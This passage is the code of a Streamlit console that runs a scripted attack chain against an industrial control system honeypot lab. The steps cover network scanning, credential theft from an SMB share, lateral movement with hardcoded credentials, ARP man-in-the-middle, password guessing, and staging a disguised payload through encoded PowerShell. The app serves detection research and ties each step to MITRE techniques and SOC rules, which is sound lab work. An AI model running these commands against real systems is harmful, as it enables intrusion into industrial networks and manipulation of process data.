        victim_out = f"{hist_host} -> {peer}: skipped (missing historian SSH credentials)"

    return (
        "[Remote EWS arpspoof status]\n"
        + remote_out
        + "\n\n[Historian victim ARP check over SSH]\n"
        + victim_out
        + "\n\n[arp -n focused]\n"
        + arp_out
        + "\n\n[ip neigh focused]\n"
        + neigh_out
        + "\n\n[Note]\n"
        + "SOC detections can lag by 10-60 seconds depending on ingestion timing."
    )


def launch_rdp() -> str:
    host = st.session_state.ews_host
    user = st.session_state.ews_user
    password = st.session_state.ews_password
    cmd = f"xfreerdp /v:{host} /u:{user} /p:'{password}' /cert:ignore /dynamic-resolution"
    try:
        check = subprocess.run(["bash", "-lc", "command -v xfreerdp"], capture_output=True, text=True, timeout=5)
        if check.returncode != 0:
            return "RDP launch failed: xfreerdp is not installed on this machine."
        subprocess.Popen(["bash", "-lc", cmd], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return "RDP launch command sent."
    except Exception as exc:
        return f"RDP launch failed: {exc}"


def run_diagnostics() -> str:
    host = st.session_state.ews_host
    user = st.session_state.ews_user
    password = st.session_state.ews_password
    lines: List[str] = []
    lines.append(f"Target EWS: {host}")
    lines.append(f"SSH user: {user}")
    lines.append(f"Ping: {'OK' if check_tcp(host, 22) or check_tcp(host, 3389) else 'UNREACHABLE'}")
    lines.append(f"SSH 22: {'OPEN' if check_tcp(host, 22) else 'CLOSED'}")
    lines.append(f"RDP 3389: {'OPEN' if check_tcp(host, 3389) else 'CLOSED'}")
    try:
        c = open_ssh(host, user, password)
        _, so, _ = c.exec_command("hostname", get_pty=True, timeout=10)
        lines.append(f"SSH auth: OK (hostname: {so.read().decode(errors='replace').strip()})")
        c.close()
    except Exception as exc:
        lines.append(f"SSH auth: FAILED ({exc})")
    return "\n".join(lines)


def collect_network_arp_snapshot() -> str:
    # Populate ARP cache with a quick ping sweep, then show the full neighbor view.
    sweep_cmd = "for i in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$i >/dev/null 2>&1 & done; wait"
    _ = run_local(sweep_cmd, timeout=40)
    arp_out = run_local("arp -n", timeout=8)
    neigh_out = run_local("ip neigh", timeout=8)
    return "[arp -n]\n" + arp_out + "\n\n[ip neigh]\n" + neigh_out


def get_ews_mac() -> str:
    host = st.session_state.ews_host
    out = run_local(f"arp -n | grep {host} || true", timeout=8)
    if out.strip() and out.strip() != "(no output)":
        return out
    # Try to refresh ARP entry by pinging target once.
    _ = run_local(f"ping -c 1 {host} >/dev/null 2>&1 || true", timeout=6)
    return run_local(f"arp -n | grep {host} || true", timeout=8)


def step_definitions(level3_subnet: str, smb_target: str, historian_host: str, opcua_endpoint: str) -> List[AttackStep]:
    ews_host = st.session_state.ews_host
    ews_user = st.session_state.ews_user
    level35_jump_host = st.session_state.level35_jump_host
    arpspoof_path = st.session_state.arpspoof_path.strip() or ARPSPOOF_PATH
    arpspoof_iface = st.session_state.arpspoof_iface.strip() or ARPSPOOF_IFACE
    arpspoof_target_1 = st.session_state.arpspoof_target_1.strip() or ARPSPOOF_TARGET_1
    arpspoof_target_2 = st.session_state.arpspoof_target_2.strip() or ARPSPOOF_TARGET_2
    manipulate_script = st.session_state.manipulate_script.strip() or MANIPULATE_SCRIPT
    ews_password_escaped = st.session_state.ews_password.replace("'", "'\"'\"'")
    nmap_base = (
        "nmap --open -T4 --max-retries 1 --host-timeout 12s "
        "-p 22,80,139,443,445,3389,4840,5000,3000 192.168.1.0/24"
    )
    nmap_timeout = 240
    nmap_exec = nmap_base
    python_exec = (
        'cmd /c "where py >nul 2>&1 && (py -3.11 \"{script}\") '
        '|| (where python >nul 2>&1 && (python \"{script}\") '
        '|| (if exist \"C:\\Python311\\python.exe\" (\"C:\\Python311\\python.exe\" \"{script}\") '
        'else (echo Python 3.11 not found on EWS. Install Python or update path.& exit /b 1)))"'
    )
    endpoint_clean = opcua_endpoint.replace("opc.tcp://", "").split("/")[0]
    if ":" in endpoint_clean:
        opc_host, opc_port_str = endpoint_clean.rsplit(":", 1)
    else:
        opc_host, opc_port_str = endpoint_clean, "4840"
    try:
        opc_port = int(opc_port_str)
    except ValueError:
        opc_host, opc_port = "192.168.1.11", 4840

    opc_probe_display = build_opc_probe_display(opc_host, opc_port)
    opc_probe_exec = build_opc_probe_exec(opc_host, opc_port)
    smb_user = st.session_state.smb_user.strip()
    smb_password = st.session_state.smb_password
    if smb_user:
        smb_mount = (
            f'net use Z: \\\\{smb_target}\\Operations "{smb_password}" '
            f'/user:"{smb_user}" /persistent:no'
        )
        smb_display = (
            f"net use Z: /delete /y\n"
            f"net use Z: \\\\{smb_target}\\Operations <password> /user:{smb_user} /persistent:no\n"
            f"dir Z:\\\n"
            f"type Z:\\shift_notes.txt\n"
            f"type Z:\\ews_maintenance_access.txt"
        )
    else:
        smb_mount = f"net use Z: \\\\{smb_target}\\Operations /persistent:no"
        smb_display = (
            f"net use Z: /delete /y\n"
            f"net use Z: \\\\{smb_target}\\Operations /persistent:no\n"
            f"dir Z:\\\n"
            f"type Z:\\shift_notes.txt\n"
            f"type Z:\\ews_maintenance_access.txt"
        )

    smb_exec = (
        f'cmd /c "net use Z: /delete /y >nul 2>&1 & {smb_mount} '
        f'& if errorlevel 1 (echo SMB mount failed & exit /b 1) '
        f'& dir Z:\\ & type Z:\\shift_notes.txt & type Z:\\ews_maintenance_access.txt"'
    )

    smb_story_local = (
        "if command -v smbclient >/dev/null 2>&1; then "
        + (
            f"smbclient //{smb_target}/Operations -U '{smb_user}%{smb_password}' -m SMB3 "
            if smb_user
            else f"smbclient //{smb_target}/Operations -N -m SMB3 "
        )
        + "-c \"ls; get shift_notes.txt /tmp/shift_notes_demo.txt; get ews_maintenance_access.txt /tmp/ews_maintenance_access_demo.txt\" "
        + "&& echo '--- shift_notes.txt ---' && sed -n '1,120p' /tmp/shift_notes_demo.txt "
        + "&& echo '--- ews_maintenance_access.txt ---' && sed -n '1,120p' /tmp/ews_maintenance_access_demo.txt; "
        + "else echo 'smbclient not installed on attacker host'; exit 1; fi"
    )

    manipulate_display = build_manipulation_display(opcua_endpoint, manipulate_script)
    manipulate_exec = build_manipulation_exec(opcua_endpoint, manipulate_script)

    return [
        AttackStep(
            1,
            "Initial foothold (Level 3.5)",
            "T0866",
            "Establish operator shell access and validate foothold context.",
            f"ssh analyst@{level35_jump_host}\nhostname && whoami",
            "hostname && whoami",
            "hostname && whoami",
            "local",
            10,
        ),
        AttackStep(
            2,
            "Discovery of Level 3 services",
            "T0846",
            "Service discovery from attacker host.",
            nmap_base,
            nmap_base,
            nmap_exec,
            "local",
            nmap_timeout,
        ),
        AttackStep(
            3,
            "Anonymous SMB browse + credential discovery",
            "T0811",
            "Browse anonymous Operations share and read credential-adjacent notes.",
            (
                f"smbclient -L //{smb_target} -N\n"
                f"smbclient //{smb_target}/Operations -N -c \"ls\"\n"
                f"smbclient //{smb_target}/Operations -N -c \"get shift_notes.txt /tmp/shift_notes.txt\" && cat /tmp/shift_notes.txt\n"
                f"smbclient //{smb_target}/Operations -N -c \"get ews_maintenance_access.txt /tmp/ews_access.txt\" && cat /tmp/ews_access.txt"
            ),
            smb_display,
            (
                f"smbclient -L //{smb_target} -N "
                f"&& smbclient //{smb_target}/Operations -N -c \"ls\" "
                f"&& smbclient //{smb_target}/Operations -N -c \"get shift_notes.txt /tmp/shift_notes.txt\" "
                f"&& cat /tmp/shift_notes.txt "
                f"&& smbclient //{smb_target}/Operations -N -c \"get ews_maintenance_access.txt /tmp/ews_access.txt\" "
                f"&& cat /tmp/ews_access.txt"
            ),
            "local",
            180,
        ),
        AttackStep(
            4,
            "Use discovered creds to access EWS",
            "T0866",
            "Pivot to EWS with discovered john/Cisco credentials (SSH or RDP).",
            (
                f"xfreerdp /v:{ews_host} /d:. /u:{ews_user} /p:'{st.session_state.ews_password}' /cert:ignore /dynamic-resolution"
                if st.session_state.ews_access_method == "RDP"
                else f"ssh {ews_user}@{ews_host}"
            )
            + "\nhostname && whoami",
            "hostname && whoami",
            (
                f"command -v xfreerdp >/dev/null 2>&1 "
                f"&& (xfreerdp /v:{ews_host} /d:. /u:{ews_user} /p:'{ews_password_escaped}' /cert:ignore /dynamic-resolution >/tmp/step4_rdp.log 2>&1 & "
                f"echo 'RDP launch command sent.') "
                f"|| (echo 'xfreerdp is not installed on this host.'; exit 1)"
                if st.session_state.ews_access_method == "RDP"
                else 'cmd /c "hostname && whoami"'
            ),
            ("local" if st.session_state.ews_access_method == "RDP" else "ews"),
            90,
        ),
        AttackStep(
            5,
            "Historian access from EWS",
            "T0802",
            "Collect historian tag history from EWS context.",
            (
                f"ssh {ews_user}@{ews_host} \"curl -c cookies.txt -X POST -d username=john -d password=Cisco http://{historian_host}:5000/login\"\n"
                f"ssh {ews_user}@{ews_host} \"curl -b cookies.txt http://{historian_host}:5000/portal/history?tag=weld_cell_temperature_c\""
            ),
            (
                f"curl -c cookies.txt -X POST -d username=john -d password=Cisco http://{historian_host}:5000/login\n"
                f"curl -b cookies.txt http://{historian_host}:5000/portal/history?tag=weld_cell_temperature_c"
            ),
            (
                f'cmd /c "curl -s -c C:\\Users\\john\\Downloads\\hist.cookies '
                f'-X POST -d username=john -d password=Cisco http://{historian_host}:5000/login >nul '
                f'&& curl -s -b C:\\Users\\john\\Downloads\\hist.cookies '
                f'http://{historian_host}:5000/portal/history?tag=weld_cell_temperature_c"'
            ),
            "ews",
            120,
        ),
        AttackStep(
            6,
            "OPC UA probe from EWS",
            "T0861",
            "Use a lightweight network probe from EWS to validate the OPC UA path.",
            f"ssh {ews_user}@{ews_host} \"{opc_probe_display}\"",
            opc_probe_display,
            opc_probe_exec,
            "ews",
            90,
        ),
        AttackStep(
            7,
            "ARP MITM",
            "T0830",
            "Run arpspoof on EWS via SSH (same ethernet segment as historian/OPC UA), then verify ARP table.",
            f'ssh {ews_user}@{ews_host} "{arpspoof_path} --list"\n'
            f'ssh {ews_user}@{ews_host} "{build_arpspoof_display(arpspoof_path, arpspoof_iface, arpspoof_target_1, arpspoof_target_2)[7:-1]}"',
            "arp -n | grep 192.168.1.11",
            "(started by Run Step 7 controls on EWS via SSH)",
            "ews",
            45,
        ),
        AttackStep(
            8,
            "Tag manipulation",
            "T0831",
            "Stage a disguised telemetry sync tool under a Microsoft-looking AppData path on EWS, execute it, and inspect the payload template for demo explanation.",
            f"ssh {ews_user}@{ews_host} \"powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand <stager>\"",
            manipulate_display,
            manipulate_exec,
            "ews",
            240,
        ),
    ]


def variant_definitions(smb_target: str, historian_host: str, opcua_endpoint: str) -> List[AttackVariant]:
    ews_host = st.session_state.ews_host.strip() or EWS_HOST
    ews_user = st.session_state.ews_user.strip() or EWS_USER
    ews_password = st.session_state.ews_password
    endpoint_clean = opcua_endpoint.replace("opc.tcp://", "").split("/")[0]
    if ":" in endpoint_clean:
        opc_host, opc_port_str = endpoint_clean.rsplit(":", 1)
    else:
        opc_host, opc_port_str = endpoint_clean, "4840"
    try:
        opc_port = int(opc_port_str)
    except ValueError:
        opc_host, opc_port = "192.168.1.11", 4840

    failed_then_success = (
        "for i in 1 2 3; do "
        f"sshpass -p 'WrongPassword!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
        f"-o PreferredAuthentications=password -o PubkeyAuthentication=no -o ConnectTimeout=5 {ews_user}@{ews_host} hostname >/tmp/failed_ssh_$i.txt 2>&1 || true; "
        "done; "
        f"sshpass -p '{ews_password}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
        f"-o PreferredAuthentications=password -o PubkeyAuthentication=no -o ConnectTimeout=5 {ews_user}@{ews_host} "
        "\"hostname && whoami\""
    )
    smb_collection = (
        f"smbclient //{smb_target}/Operations -N -m SMB3 "
        "-c \"ls; allinfo shift_notes.txt; allinfo ews_maintenance_access.txt; "
        "get shift_notes.txt /tmp/variant_shift_notes.txt; "
        "get ews_maintenance_access.txt /tmp/variant_ews_access.txt\" "
        "&& echo '--- shift_notes.txt ---' && sed -n '1,80p' /tmp/variant_shift_notes.txt "
        "&& echo '--- ews_maintenance_access.txt ---' && sed -n '1,80p' /tmp/variant_ews_access.txt"
    )
    historian_collection = (
        f'cmd /c "curl -s -c C:\\Users\\john\\Downloads\\hist.cookies '
        f'-X POST -d username=john -d password=Cisco http://{historian_host}:5000/login >nul '
        f'&& curl -s http://{historian_host}:5000/tags '
        f'&& echo. && curl -s -b C:\\Users\\john\\Downloads\\hist.cookies '
        f'http://{historian_host}:5000/portal/history?tag=weld_cell_temperature_c '
        f'&& echo. && curl -s -b C:\\Users\\john\\Downloads\\hist.cookies '
        f'http://{historian_host}:5000/portal/history?tag=air_pressure_bar '
        f'&& echo. && curl -s -b C:\\Users\\john\\Downloads\\hist.cookies '
        f'http://{historian_host}:5000/portal/history?tag=line1_vibration_mm_s"'
    )
    critical_opcua = (
        "python3 -c \"import socket; "
        f"payload = b'MSGF' + b'\\x01\\xa1\\x02' + b'air_pressure_bar' + b'VARIANT_CRITICAL'; "
        f"s = socket.create_connection(('{opc_host}', {opc_port}), timeout=5); "
        "s.sendall(payload); s.close(); print('critical opcua write-like probe sent')\""
    )
    powershell_recon = (
        'powershell -NoProfile -Command "'
        "Write-Output RECON-SESSION-START; "
        "whoami; "
        "hostname; "
        "Get-ChildItem Env: | Select-Object -First 8 Name,Value; "
        "Get-Process | Select-Object -First 8 Name,Id; "
        "Get-NetIPAddress | Select-Object -First 6 IPAddress,InterfaceAlias"
        '"'
    )

    return [
        AttackVariant(
            "failed_ssh_then_success",
            "Failed SSH guessing then success",
            "T1110 / T0866",
            "Generate noisy failed SSH auth attempts against EWS, then confirm a real pivot with the valid credential.",
            failed_then_success,
            failed_then_success,
            "local",
            120,
            ("100402",),
        ),
        AttackVariant(
            "powershell_recon",
            "PowerShell recon on EWS",
            "T1059 / T1082 / T1083",
            "Run a reconnaissance-flavored PowerShell block on EWS so host command and script-block detections light up.",
            powershell_recon,
            powershell_recon,
            "ews",
            120,
            ("100402", "100404", "100405"),
        ),
        AttackVariant(
            "smb_deep_collection",
            "Deeper SMB collection session",
            "T0811",
            "Browse Operations, inspect file metadata, and pull multiple files like a more realistic collection phase.",
            smb_collection,
            smb_collection,
            "local",
            180,
            ("100302",),
        ),
        AttackVariant(
            "historian_heavy_collection",
            "Historian-heavy collection session",
            "T0802",
            "Log in to the historian from EWS context and pull multiple process tags to model an analyst-style data collection session.",
            historian_collection,
            historian_collection,
            "ews",
            180,
            ("100301", "100402"),
        ),
        AttackVariant(
            "critical_opcua_write",
            "Critical OPC UA write-like session",
            "T0831",
            "Send a high-confidence write-like OPC UA payload toward a sensitive tag so the OT impact path triggers clearly.",
            critical_opcua,
            critical_opcua,
            "local",
            90,
            ("100303", "100304", "100305"),
        ),
    ]


def render_output(step_key: str) -> None:
    output = st.session_state.buffers.get(step_key, "")
    st.code(output or "(no output yet)", language="powershell")


def main() -> None:
    st.set_page_config(page_title="ICS Honeypot Attack Demo", layout="wide")
    init_state()

    st.title("ICS Honeypot Attack Demo Console")

    with st.sidebar:
        st.header("Demo Controls")
        st.text_input("Demo session ID", key="demo_session_id")
        if st.button("New demo session ID", use_container_width=True):
            st.session_state.demo_session_id = new_demo_session_id()
            st.rerun()
        st.checkbox("Inject synthetic fallback markers", key="inject_demo_markers")
        st.caption("Leave this off for live-only telemetry. Turn it on only if you explicitly want synthetic fallback markers.")
        st.selectbox("EWS access method", ["SSH", "RDP"], index=0, key="ews_access_method")
        st.text_input("EWS host", key="ews_host")
        st.text_input("Loki URL", value=LOKI_URL, key="loki_url")
        st.text_input("Grafana URL", value=GRAFANA_URL, key="grafana_url")
        st.text_input("Wazuh URL", value=WAZUH_URL, key="wazuh_url")
        st.text_input("Historian URL", value=HISTORIAN_URL, key="historian_url")
        st.selectbox("Evidence window", ["15m", "1h", "6h", "24h", "7d"], index=0, key="lookback")

        st.markdown("---")
        st.write("Attack Targets")
        st.text_input("Level 3.5 jump host", key="level35_jump_host")
        st.text_input("Level 3 subnet", value=LEVEL3_SUBNET, key="level3_subnet")
        st.text_input("SMB target", value=SMB_TARGET, key="smb_target")
        st.text_input("Historian host", value=HISTORIAN_HOST, key="historian_host")
        st.text_input("OPC UA endpoint", value=OPCUA_ENDPOINT, key="opcua_endpoint")
        st.text_input("Historian SSH user", key="historian_ssh_user")
        st.text_input("Historian SSH password", key="historian_ssh_password", type="password")

        st.markdown("---")
        st.write("Quick links")
        st.markdown(f"- [Grafana overview]({grafana_link_for_session('.*', 'now-2h')})")
        st.markdown(f"- [Grafana this session]({grafana_link_for_session(get_demo_session_id(), 'now-30m')})")
        st.markdown(f"- [Wazuh]({st.session_state.wazuh_url})")
        st.markdown(f"- [Historian]({st.session_state.historian_url})")

    col_a, col_b = st.columns([1.3, 1])

    with col_a:
        st.subheader("1) Environment and Pipeline")
        h = fetch_pipeline_health()
        hc1, hc2, hc3, hc4 = st.columns(4)
        hc1.metric("Zeek", h["Zeek"])
        hc2.metric("Wazuh", h["Wazuh"])
        hc3.metric("Loki", h["Loki"])
        if hc4.button("Refresh health", use_container_width=True):
            st.rerun()

        eh = fetch_ews_health(st.session_state.ews_host)
        ec1, ec2 = st.columns(2)
        ec1.metric("EWS SSH (22)", eh["EWS SSH"])
        ec2.metric("EWS RDP (3389)", eh["EWS RDP"])

        st.info(
            "Threat model chain: initial access via Level 3.5 jump path -> discovery -> SMB collection -> movement to EWS -> historian/OPC UA access -> ARP MITM -> telemetry integrity manipulation."
        )
        st.caption(f"Current demo session: `{get_demo_session_id()}`")
        st.warning(
            "Credential acquisition story for demo: attacker lands on Level 3.5 path, browses anonymous SMB Operations share, discovers john/Cisco in maintenance note, then pivots to EWS over SSH/RDP before historian/OPC UA and MITM stages."
        )

        st.subheader("1.5) Custom Command Runner")
        cc1, cc2, cc3 = st.columns([1, 1, 1])
        cc1.selectbox(
            "Run on",
            ["ews", "local"],
            key="custom_exec_mode",
            format_func=lambda value: "EWS over SSH" if value == "ews" else "Local attacker shell",
        )
        cc2.number_input("Timeout (s)", min_value=5, max_value=600, step=5, key="custom_timeout")
        cc3.checkbox("Request PTY", key="custom_use_pty")
        st.text_area(
            "Editable custom command",
            key="custom_command_input",
            height=100,
            help="Run an ad hoc command on the EWS over SSH or in the local attacker shell.",
        )
        cb1, cb2 = st.columns(2)
        if cb1.button("Run custom command", use_container_width=True):
            run_custom_command()
        if cb2.button("Clear custom output", use_container_width=True):
            st.session_state.buffers.pop("custom_runner", None)
            st.session_state.last_exit.pop("custom_runner", None)
        if "custom_runner" in st.session_state.buffers:
            custom_rc = st.session_state.last_exit.get("custom_runner")
            if custom_rc == 0:
                st.success(f"Custom command exit code: {custom_rc}")
            elif custom_rc is not None:
                st.error(f"Custom command exit code: {custom_rc}")
            render_output("custom_runner")

        st.subheader("2) Attacker Storyline Actions")
        steps = step_definitions(
            st.session_state.level3_subnet,
            st.session_state.smb_target,
            st.session_state.historian_host,
            st.session_state.opcua_endpoint,
        )

        for step in steps:
            step_key = f"step_{step.idx}"
            running = st.session_state.running.get(step_key, False)
            with st.expander(f"Step {step.idx}: {step.title} ({step.mitre})", expanded=(step.idx == 1)):
                st.info(step.description)
                st.markdown("Attacker entry path")
                if step.title == "Use discovered creds to access EWS" and st.session_state.ews_access_method == "RDP":
                    st.code(
                        f"xfreerdp /v:{st.session_state.ews_host} /d:. /u:{st.session_state.ews_user} /p:'<password>' /cert:ignore /dynamic-resolution",
                        language="bash",
                    )
                elif step.exec_mode == "local":
                    st.code("local attacker shell (jump-path context)", language="bash")
                elif st.session_state.ews_access_method == "SSH":
                    st.code(f"ssh {st.session_state.ews_user}@{st.session_state.ews_host}", language="bash")
                else:
                    st.code(
                        f"xfreerdp /v:{st.session_state.ews_host} /u:{st.session_state.ews_user} /p:'<password>' /cert:ignore",
                        language="bash",
                    )

                st.markdown("Command preview")
                st.code(step.ssh_display, language="bash")

                step_command_key = f"step_command_{step.idx}"
                if step_command_key not in st.session_state:
                    st.session_state[step_command_key] = step.command_exec
                st.text_area(
                    "Editable command used when you click Run Step",
                    key=step_command_key,
                    height=120,
                )

                if step.title == "Discovery of Level 3 services":
                    st.caption("Step 2 uses a fixed quick scan command for demo stability.")

                if step.title == "ARP MITM":
                    st.caption("arpspoof is a dsniff tool that performs ARP poisoning to position the attacker between two hosts (adversary-in-the-middle).")
                    st.info("Step 7 ARP before/after now runs from historian over SSH (corrupted victim view), which is the correct vantage point for your demo.")
                    st.markdown("Recommended Step 5 sequence")
                    s1, s2 = st.columns(2)
                    if s1.button("Step 7A: List interfaces", key=f"step{step.idx}_list_ifaces", disabled=running):
                        rc_if, out_if = run_remote_capture('cmd /c "C:\\Users\\john\\Downloads\\arpspoof.exe --list"', 30, use_pty=True)
                        st.session_state.buffers[step_key] = (
                            st.session_state.buffers.get(step_key, "")
                            + "\n$ ssh john@192.168.1.5 \"C:\\Users\\john\\Downloads\\arpspoof.exe --list\"\n\n"
                            + out_if
                            + f"\n\n[exit code: {rc_if}]\n"
                        )
                    if s2.button("Step 7B: ARP -n before", key=f"step{step.idx}_arp_before_seq", disabled=running):
                        capture_arp_before()
                        st.session_state.buffers[step_key] = st.session_state.buffers.get(step_key, "") + "\n$ arp -n (before)\n\n" + st.session_state.arp_before + "\n"

                    manual_mitm_key = f"step{step.idx}_manual_command"
                    if manual_mitm_key not in st.session_state:
                        st.session_state[manual_mitm_key] = build_arpspoof_display(
                            st.session_state.arpspoof_path,
                            st.session_state.arpspoof_iface,
                            st.session_state.arpspoof_target_1,
                            st.session_state.arpspoof_target_2,
                        )
                    st.text_area(
                        "Editable manual EWS command for Step 7",
                        key=manual_mitm_key,
                        height=90,
                        help="Use this if you want to run a custom MITM command directly on the EWS.",
                    )

                    b1, b2, b3 = st.columns(3)
                    if b1.button("Step 7C: Run MITM", key=f"run_{step.idx}", disabled=running):
                        start_mitm(step.idx)
                    if b2.button("Stop MITM", key=f"stop_{step.idx}", disabled=running):
                        stop_mitm(step.idx)
                    if b3.button("Run manual command", key=f"manual_run_{step.idx}", disabled=running):
                        rc_manual, out_manual = execute_command(
                            st.session_state.get(manual_mitm_key, ""),
                            "ews",
                            45,
                            use_pty=True,
                        )
                        set_command_result(step_key, st.session_state.get(manual_mitm_key, ""), out_manual, rc_manual)

                    if st.button("Check MITM on EWS", key=f"check_{step.idx}", disabled=running):
                        check_remote_mitm_status(step.idx)

                    ab1, ab2 = st.columns(2)
                    if ab1.button("Step 7D: ARP -n after", key=f"arp_after_{step.idx}", disabled=running):
                        capture_arp_after()
                        st.session_state.buffers[step_key] = st.session_state.buffers.get(step_key, "") + "\n$ arp -n (after)\n\n" + st.session_state.arp_after + "\n"
                        st.session_state.evidence_out[step.idx] = collect_mitm_evidence()
                    if ab2.button("Capture MITM evidence now", key=f"mitm_evidence_{step.idx}", disabled=running):
                        st.session_state.evidence_out[step.idx] = collect_mitm_evidence()

                    if st.session_state.arp_before:
                        st.markdown("ARP snapshot before MITM")
                        st.code(st.session_state.arp_before, language="bash")
                    if st.session_state.arp_after:
                        st.markdown("ARP snapshot after MITM")
                        st.code(st.session_state.arp_after, language="bash")

                    if st.session_state.mitm_running:
                        st.success("MITM status: running")
                    else:
                        st.info("MITM status: stopped")
                else:
                    rb1, rb2 = st.columns(2)
                    if rb1.button(f"Run Step {step.idx}", key=f"run_{step.idx}", disabled=running):
                        start_step(step, command_override=st.session_state.get(step_command_key, step.command_exec))
                    if rb2.button(f"Reset Step {step.idx}", key=f"reset_{step.idx}", disabled=running):
                        st.session_state[step_command_key] = step.command_exec
                        st.rerun()

                if step.title == "Tag manipulation":
                    if st.button("Show staged tool template", key="show_manip_script", disabled=running):
                        rc_script, out_script = 0, load_manipulation_payload()
                        st.session_state.buffers[step_key] = (
                            st.session_state.buffers.get(step_key, "")
                            + f"\n$ local payload template: {MANIPULATE_TEMPLATE_PATH}\n\n{out_script}\n\n[exit code: {rc_script}]\n"
                        )

                if running:
                    st.warning("Command running...")
                rc = st.session_state.last_exit.get(step_key)
                if rc is not None:
                    if rc == 0:
                        st.success(f"Last exit code: {rc}")
                    else:
                        st.error(f"Last exit code: {rc}")

                if st.button(f"Show evidence after Step {step.idx}", key=f"evidence_{step.idx}"):
                    run_evidence_bundle(step.idx)
                if step.idx in st.session_state.evidence_out:
                    st.code(st.session_state.evidence_out[step.idx], language="bash")

                render_output(step_key)

        st.subheader("3) Attack Variant Library")
        st.caption("Use these to generate more diverse correlated sessions for the thesis without changing the main 8-step demo chain.")
        variants = variant_definitions(
            st.session_state.smb_target,
            st.session_state.historian_host,
            st.session_state.opcua_endpoint,
        )

        for variant in variants:
            variant_key = f"variant_{variant.key}"
            running = st.session_state.running.get(variant_key, False)
            with st.expander(f"{variant.title} ({variant.mitre})", expanded=False):
                st.info(variant.description)
                st.markdown("Expected detections")
                if variant.expected_rules:
                    st.code(", ".join(variant.expected_rules), language="text")
                st.markdown("Command preview")
                st.code(variant.command_display, language="bash" if variant.exec_mode == "local" else "powershell")

                variant_command_key = f"variant_command_{variant.key}"
                if variant_command_key not in st.session_state:
                    st.session_state[variant_command_key] = variant.command_exec
                st.text_area(
                    "Editable command used when you click Run Variant",
                    key=variant_command_key,
                    height=120,
                )

                vb1, vb2, vb3 = st.columns(3)
                if vb1.button("Run Variant", key=f"run_variant_{variant.key}", disabled=running):
                    start_variant(variant, command_override=st.session_state.get(variant_command_key, variant.command_exec))
                if vb2.button("Reset Variant", key=f"reset_variant_{variant.key}", disabled=running):
                    st.session_state[variant_command_key] = variant.command_exec
                    st.rerun()
                if vb3.button("Show Variant Evidence", key=f"evidence_variant_{variant.key}", disabled=running):
                    run_variant_evidence_bundle(variant_key)

                if running:
                    st.warning("Variant command running...")
                rc = st.session_state.last_exit.get(variant_key)
                if rc is not None:
                    if rc == 0:
                        st.success(f"Last exit code: {rc}")
                    else:
                        st.error(f"Last exit code: {rc}")

                if variant_key in st.session_state.evidence_out:
                    st.code(st.session_state.evidence_out[variant_key], language="bash")

                render_output(variant_key)

    with col_b:
        st.subheader("Demo Script")
        st.markdown(
            """
1. Initial foothold at Level 3.5 jump path (narrative + local host context).
2. Discover Level 3 services with nmap scan.
3. Access anonymous SMB Operations share and read credential-adjacent files.
4. Use discovered john/Cisco to pivot into EWS via SSH or RDP.
5. Access historian history endpoint from EWS context.
6. Probe OPC UA reachability from EWS context.
7. Execute ARP MITM from EWS and verify ARP cache indicators.
8. Stage and run the disguised OT telemetry sync tool from EWS and show the payload template for explanation.
9. Correlate detections in Grafana/Loki/Wazuh evidence panels.
            """.strip()
        )

        st.subheader("MITRE Mapping")
        st.table(
            [
                {"Step": 1, "Technique": "T0846", "Meaning": "Discovery/enumeration"},
                {"Step": 2, "Technique": "T0811", "Meaning": "Repository collection (SMB)"},
                {"Step": 3, "Technique": "T0802", "Meaning": "Historian access/collection"},
                {"Step": 4, "Technique": "T0861", "Meaning": "Direct OPC UA interaction"},
                {"Step": 5, "Technique": "T0830", "Meaning": "Adversary-in-the-middle"},
                {"Step": 6, "Technique": "T0831", "Meaning": "Manipulate process values"},
            ]
        )

        st.subheader("Variant Sessions")
        st.markdown(
            """
- Failed SSH guessing then success: noisy auth attempts followed by a valid pivot.
- PowerShell recon on EWS: host discovery and script-block activity.
- Deeper SMB collection: broader file enumeration and staged collection.
- Historian-heavy collection: repeated process-tag retrieval from EWS context.
- Critical OPC UA write-like session: OT impact-oriented traffic against a sensitive tag.
            """.strip()
        )

        st.subheader("Grafana Switch")
        st.markdown(f"Open dashboard after each attack stage: [SOC Dashboard]({grafana_link_for_session(get_demo_session_id(), 'now-30m')})")

        st.subheader("Detection Evidence")
        if st.button("Refresh MITRE evidence", use_container_width=True):
            rows = []
            errors = []
            rule_map: List[Tuple[str, str, str]] = [
                ("100202", "T0802", "Historian history query event"),
                ("100301", "T0822/T0886", "Web/remote access path"),
                ("100302", "T0811", "SMB repository access"),
                ("100303", "T0861", "OPC UA interaction"),
                ("100304", "T0830", "Write-like MITM candidate"),
                ("100305", "T0830", "Critical write-like event"),
                ("100401", "T0021", "RDP session on EWS endpoint"),
                ("100402", "T0021", "SSH session on EWS endpoint"),
                ("100403", "T0059", "Suspicious process execution on EWS"),
                ("100209", "T0831", "Process anomaly / integrity impact"),
            ]
            for rid, mitre, desc in rule_map:
                try:
                    count = int(fetch_rule_count(st.session_state.loki_url, rid, st.session_state.lookback))
                    rows.append({"Rule": rid, "MITRE": mitre, "Meaning": desc, "Count": count})
                except Exception as exc:
                    errors.append(f"{rid}: {exc}")
            if rows:
                st.dataframe(rows, use_container_width=True, hide_index=True)
            if errors:
                st.warning("; ".join(errors))

        st.subheader("Notes")
        st.info("Use controlled lab targets only. Keep one dashboard tab open for stable queries.")
        st.warning("If RDP is DOWN, power on EWS VM/host, ensure Remote Desktop is enabled, and keep Windows firewall RDP rule active.")


if __name__ == "__main__":
    main()
